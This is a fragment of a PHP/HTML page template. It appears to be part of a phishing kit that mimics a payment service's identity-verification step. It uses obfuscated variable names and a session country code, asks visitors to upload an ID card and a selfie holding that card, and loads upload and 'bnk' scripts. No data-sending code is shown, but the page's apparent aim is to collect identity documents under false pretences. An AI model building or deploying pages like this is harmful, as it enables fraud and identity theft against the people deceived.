...
<html lang="en-US">
   <head>
      <meta charSet="utf-8" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys76x; ?></title>
   ...
   <body>
                        ...
                        <div>
                           <div class="signup-page-form">
                              ...
                              <div class="signupAppContent">
                                 <div>
                                    <div class="center">
                                       <h1 class="vx_text-2 center "><?php echo $xys76x; ?></h1>
                                    </div>
                                 </div>
                                 <div class="fieldGroupContainer">
                                    <div id="xyscontentidx">
                                       <div>
                                          <p class="xyscontentidpx">1 - <?php echo $xys77x; ?></p>
                                          <img src="asset/img/idcard.svg">
                                       </div>
                                       <div>
                                          <p class="xyscontentidpx">2 - <?php echo $xys78x; ?></p>
                                          <img src="asset/img/selcard.svg">
                                       </div>
                                       <p style="margin-top: 5px;">(JPG - JPEG - PNG - GIF)</p>
      ...
      <script src="asset/js/jquery.min.js"></script> <script src="asset/js/bnk.js"></script> <script src="src/fileuploader.js"></script> <script src="js/custom.js"></script> 
   </body>
</html>